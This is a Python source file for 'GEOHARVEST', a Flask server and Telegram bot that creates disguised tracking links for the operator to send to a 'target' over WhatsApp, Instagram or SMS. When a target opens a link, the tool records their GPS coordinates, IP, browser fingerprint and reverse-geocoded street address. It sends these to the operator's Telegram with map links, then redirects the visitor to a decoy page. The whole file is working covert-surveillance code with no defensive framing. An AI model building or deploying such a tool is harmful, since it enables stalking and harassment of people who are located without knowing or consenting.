#!/usr/bin/env python3
"""
GEOHARVEST — Telegram-controlled device geolocation & fingerprint collector.

Single process: Flask (ingest + admin) + Bot API long-poll thread.
"""
import hashlib
import hmac
import json
import os
import secrets
import sqlite3
import threading
import time
import traceback
from datetime import datetime, timezone
from urllib.parse import quote

import requests
from flask import (Flask, Response, abort, jsonify, redirect, render_template,
                   request)

# ─────────────────────────── CONFIG ───────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
OWNER_ID  = int(os.environ.get("OWNER_ID", "0") or 0)
BASE_URL  = os.environ.get("BASE_URL", "").rstrip("/")
DB_PATH   = os.environ.get("DB_PATH", "data.sqlite3")
PORT      = int(os.environ.get("PORT", "8080"))
ADMIN_KEY = os.environ.get("ADMIN_KEY") or secrets.token_urlsafe(12)
DECOY_URL = os.environ.get("DECOY_URL", "").strip()
START_BOT = os.environ.get("START_BOT", "1") == "1"
IPAPI_KEY = os.environ.get("IPAPI_KEY", "").strip()   # optional ipapi.co key

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

# ─────────────────────────── DB ───────────────────────────
def db():
    conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with open(os.path.join(os.path.dirname(__file__), "schema.sql")) as f:
        sql = f.read()
    conn = sqlite3.connect(DB_PATH)
    conn.executescript(sql)
    conn.commit()
    conn.close()

def now():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")

# ─────────────────────────── HELPERS ───────────────────────────
def client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    return request.headers.get("X-Real-IP") or request.remote_addr or "?"

def ip_intel(ip):
    """IP → geo/ASN. Free tier, no key required for the fallback."""
    if ip in ("?", "") or ip.startswith(("127.", "10.", "192.168.", "172.16.")):
        return {}
    try:
        if IPAPI_KEY:
            r = requests.get(f"https://ipapi.co/{ip}/json/",
                             headers={"User-Agent": "geoharvest/1.0"},
                             timeout=8)
            d = r.json()
            return {"city": d.get("city"), "region": d.get("region"),
                    "country": d.get("country_name"), "org": d.get("org"),
                    "asn": d.get("asn"), "lat": d.get("latitude"),
                    "lon": d.get("longitude"), "tz": d.get("timezone")}
        r = requests.get(f"http://ip-api.com/json/{ip}",
                         params={"fields": "status,city,regionName,country,isp,org,as,lat,lon,timezone,proxy,hosting,mobile"},
                         timeout=8)
        d = r.json()
        if d.get("status") != "success":
            return {}
        return {"city": d.get("city"), "region": d.get("regionName"),
                "country": d.get("country"), "org": d.get("org") or d.get("isp"),
                "asn": d.get("as"), "lat": d.get("lat"), "lon": d.get("lon"),
                "tz": d.get("timezone"), "proxy": d.get("proxy"),
                "hosting": d.get("hosting"), "mobile": d.get("mobile")}
    except Exception:
        return {}

def rev_geo(lat, lon):
    try:
        r = requests.get("https://nominatim.openstreetmap.org/reverse",
                         params={"lat": lat, "lon": lon, "format": "jsonv2", "zoom": 18},
                         headers={"User-Agent": "geoharvest/1.0 (bot)"}, timeout=8)
        d = r.json()
        return d.get("display_name")
    except Exception:
        return None

# ─────────────────────────── TELEGRAM ───────────────────────────
def tg(method, **params):
    if not BOT_TOKEN:
        return {"ok": False, "description": "no token"}
    try:
        r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}",
                          json=params, timeout=30)
        return r.json()
    except Exception:
        return {"ok": False, "description": traceback.format_exc(limit=1)}

def send(chat_id, text, kb=None):
    p = {"chat_id": chat_id, "text": text[:4000], "parse_mode": "HTML",
         "disable_web_page_preview": True}
    if kb:
        p["reply_markup"] = {"inline_keyboard": kb}
    return tg("sendMessage", **p)

def notify_hit(token, stage, ip, intel, ua, lat, lon, acc, place, payload):
    if not OWNER_ID:
        return
    icon = {"gps": "🎯", "refine": "📡", "denied": "🚫",
            "timeout": "⏱", "nogeo": "❔", "fingerprint": "👤"}.get(stage, "•")
    lines = [f"{icon} <b>HIT</b> — <code>{token}</code> — <b>{stage}</b>",
             f"🕒 <code>{now()}</code>",
             f"🌐 IP: <code>{ip}</code>"]
    if intel:
        lines.append("📍 IP-geo: " + ", ".join(filter(None, [
            intel.get("city"), intel.get("region"), intel.get("country")])))
        if intel.get("org"):
            lines.append(f"🏢 {intel['org']}")
        if intel.get("proxy") or intel.get("hosting"):
            lines.append("⚠️ VPN/proxy/datacenter exit detected")
    if lat is not None:
        lines.append(f"🎯 GPS: <code>{lat:.6f}, {lon:.6f}</code> ±{acc or '?'}m")
    if place:
        lines.append(f"🏠 {place}")
    lines.append(f"🖥 <code>{ua[:160]}</code>")

    kb = []
    if lat is not None:
        kb.append([
            {"text": "Google Maps", "url": f"https://maps.google.com/?q={lat},{lon}"},
            {"text": "OSM", "url": f"https://www.openstreetmap.org/?mlat={lat}&mlon={lon}#map=19/{lat}/{lon}"},
        ])
        kb.append([{"text": "Yandex", "url": f"https://yandex.com/maps/?pt={lon},{lat}&z=18&l=map"}])
        tg("sendLocation", chat_id=OWNER_ID, latitude=lat, longitude=lon,
           horizontal_accuracy=min(acc or 100, 1500))
    send(OWNER_ID, "\n".join(lines), kb)

def handle_update(u):
    msg = u.get("message") or u.get("edited_message")
    if not msg:
        return
    chat = msg["chat"]["id"]
    text = (msg.get("text") or "").strip()
    if not text.startswith("/"):
        return
    if OWNER_ID and chat != OWNER_ID:
        send(chat, f"⛔ Unauthorized. Your chat_id is <code>{chat}</code>.")
        return

    parts = text.split(maxsplit=1)
    cmd = parts[0].split("@")[0].lower()
    arg = parts[1].strip() if len(parts) > 1 else ""

    if cmd in ("/start", "/help"):
        send(chat, "<b>GEOHARVEST</b>\n\n"
                   "/new &lt;label&gt; — mint a tracking link\n"
                   "/targets — list links\n"
                   "/last &lt;token&gt; — last hit\n"
                   "/map &lt;token&gt; — pin\n"
                   "/export &lt;token&gt; — JSON dump\n"
                   "/rm &lt;token&gt; — delete\n\n"
                   f"Dashboard: {BASE_URL}/admin?key={ADMIN_KEY}")

    elif cmd == "/new":
        tok = secrets.token_urlsafe(6)
        with db() as c:
            c.execute("INSERT INTO targets(token,label,created_at) VALUES(?,?,?)",
                      (tok, arg or "untitled", now()))
        send(chat, f"✅ <code>{tok}</code> — {arg or 'untitled'}\n"
                   f"{BASE_URL}/t/{tok}\n\n<i>Send this to the target. "
                   f"Works in WhatsApp/IG/SMS.</i>")

    elif cmd == "/targets":
        with db() as c:
            rows = c.execute("SELECT token,label,created_at FROM targets ORDER BY id DESC LIMIT 30").fetchall()
        if not rows:
            return send(chat, "No targets.")
        out = ["<b>Targets</b>"]
        for r in rows:
            n = c.execute("SELECT COUNT(*) FROM hits WHERE token=?", (r["token"],)).fetchone()[0] \
                if False else None
            out.append(f"<code>{r['token']}</code> — {r['label']} — {r['created_at']}")
        send(chat, "\n".join(out))

    elif cmd == "/last":
        with db() as c:
            r = c.execute("SELECT * FROM hits WHERE token=? ORDER BY id DESC LIMIT 1", (arg,)).fetchone()
        if not r:
            return send(chat, "No hits.")
        send(chat, f"<b>{r['stage']}</b> @ {r['ts']}\n<code>{r['lat']},{r['lon']}</code>\n{r['ua'][:200]}")

    elif cmd == "/map":
        with db() as c:
            r = c.execute("SELECT * FROM hits WHERE token=? AND lat IS NOT NULL "
                          "ORDER BY id DESC LIMIT 1", (arg,)).fetchone()
        if not r:
            return send(chat, "No coordinates yet.")
        tg("sendLocation", chat_id=chat, latitude=r["lat"], longitude=r["lon"],
           horizontal_accuracy=min(r["acc"] or 100, 1500))

    elif cmd == "/export":
        with db() as c:
            rows = [dict(x) for x in c.execute(
                "SELECT * FROM hits WHERE token=? ORDER BY id", (arg,)).fetchall()]
        if not rows:
            return send(chat, "Nothing to export.")
        blob = json.dumps(rows, indent=2)[:3500]
        send(chat, f"<pre>{blob}</pre>")

    elif cmd == "/rm":
        with db() as c:
            c.execute("DELETE FROM targets WHERE token=?", (arg,))
            c.execute("DELETE FROM hits WHERE token=?", (arg,))
        send(chat, f"🗑 removed <code>{arg}</code>")

def bot_loop():
    if not BOT_TOKEN:
        print("[bot] BOT_TOKEN missing — bot disabled")
        return
    print("[bot] polling")
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                             params={"offset": offset, "timeout": 50,
                                     "allowed_updates": '["message"]'}, timeout=60).json()
            for u in r.get("result", []):
                offset = u["update_id"] + 1
                try:
                    handle_update(u)
                except Exception:
                    traceback.print_exc()
        except Exception:
            time.sleep(3)

# ─────────────────────────── ROUTES ───────────────────────────
@app.get("/healthz")
def healthz():
    return {"ok": True, "ts": now()}

@app.get("/")
def index():
    return render_template("capture.html", token="direct", decoy=DECOY_URL)

@app.get("/t/<token>")
def track(token):
    with db() as c:
        row = c.execute("SELECT * FROM targets WHERE token=?", (token,)).fetchone()
    if not row:
        with db() as c:
            c.execute("INSERT OR IGNORE INTO targets(token,label,created_at) VALUES(?,?,?)",
                      (token, "auto", now()))
    return render_template("capture.html", token=token, decoy=DECOY_URL)

@app.post("/api/hit")
def api_hit():
    d = request.get_json(silent=True) or {}
    token = str(d.get("token") or "direct")[:64]
    stage = str(d.get("stage") or "fingerprint")[:16]
    ua = request.headers.get("User-Agent", "")[:400]
    ip = client_ip()

    lat = lon = acc = place = None
    if stage in ("gps", "refine"):
        try:
            lat, lon = float(d["lat"]), float(d["lon"])
            acc = float(d.get("acc") or 0)
        except (KeyError, TypeError, ValueError):
            pass

    intel = ip_intel(ip)
    if lat is not None:
        place = rev_geo(lat, lon)
    elif intel.get("lat"):
        lat, lon = float(intel["lat"]), float(intel["lon"])
        place = ", ".join(filter(None, [intel.get("city"), intel.get("region"), intel.get("country")]))

    with db() as c:
        c.execute("""INSERT INTO hits(token,stage,ip,ip_json,ua,lat,lon,acc,place,payload,ts)
                     VALUES(?,?,?,?,?,?,?,?,?,?,?)""",
                  (token, stage, ip, json.dumps(intel), ua, lat, lon, acc, place,
                   json.dumps(d)[:60000], now()))

    threading.Thread(target=notify_hit,
                     args=(token, stage, ip, intel, ua, lat, lon, acc, place, d),
                     daemon=True).start()
    return jsonify({"ok": True})

@app.get("/decoy")
def decoy():
    return redirect(DECOY_URL or "https://www.google.com")

@app.get("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        abort(403)
    with db() as c:
        targets = [dict(r) for r in c.execute(
            "SELECT t.*, (SELECT COUNT(*) FROM hits h WHERE h.token=t.token) n "
            "FROM targets t ORDER BY t.id DESC LIMIT 100").fetchall()]
        hits = [dict(r) for r in c.execute(
            "SELECT id,token,stage,ip,lat,lon,acc,place,ts FROM hits "
            "ORDER BY id DESC LIMIT 200").fetchall()]
    return render_template("admin.html", targets=targets, hits=hits,
                           key=ADMIN_KEY, base=BASE_URL)

@app.after_request
def cors(resp):
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    resp.headers["Cache-Control"] = "no-store"
    return resp

# ─────────────────────────── MAIN ───────────────────────────
init_db()
print(f"[init] admin key: {ADMIN_KEY}")
if START_BOT:
    threading.Thread(target=bot_loop, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, threaded=True)
